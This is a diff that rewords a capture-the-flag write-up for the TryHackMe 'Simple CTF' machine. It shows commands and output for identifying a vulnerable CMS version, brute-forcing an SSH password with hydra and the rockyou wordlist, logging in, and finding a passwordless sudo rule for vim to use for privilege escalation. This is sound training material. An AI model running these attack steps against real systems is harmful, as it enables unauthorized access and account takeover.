@@ -179,11 +179,10 @@ Progress: 87664 / 87665 (100.00%)
 Finished
 ===============================================================
 ```
-The page `/manager` sounds promising.
 
 ### Analyse the web page
 
-When checking the webpage (`http://10.10.167.216/simple/`) we see that it is `CMS Made Simple version v2.2.8`.
+Checking the web page (`http://10.10.167.216/simple/`) we can see that it is running `CMS Made Simple version v2.2.8`.
 
 We ought to check if there are any know vulnerabilities for this version
 ```bash
@@ -244,7 +243,7 @@ Copied to: /mnt/hgfs/Wargames/TryHackMe/CTFs/Easy/Simple_CTF/46635.py
 
 ### Brute-force the password for Mitch
 
-We can try to crack the password for `Mitch` with `hydra`
+We can try to brute-force the password for user `mitch` with `hydra`
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Simple_CTF]
 └─$ hydra -P /usr/share/wordlists/rockyou.txt -l mitch -s 2222 ssh://10.10.167.216
@@ -265,7 +264,7 @@ The password is `secret`.
 
 ### Get the user flag
 
-Now we can login a mitch via ssh a get the user flag
+Now we can login a mitch via ssh and get the user flag
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Simple_CTF]
 └─$ ssh -p 2222 mitch@10.10.167.216
@@ -292,7 +291,7 @@ G<REDACTED>!
 $ 
 ```
 
-We can also check what other users are present
+We can also check what other users are present on the system
 ```bash
 $ ls -l /home
 total 8
@@ -303,12 +302,11 @@ $
 
 ### Privilege escalation
 
-Let's start our enumeration by checking if we can run commands as root with `sudo`
+Let's start our enumeration by checking if we can run commands as root with `sudo -l`
 ```bash
 $ sudo -l
 User mitch may run the following commands on Machine:
     (root) NOPASSWD: /usr/bin/vim
-
 ```
 Yes, we can run `vim` as root without a password!
 
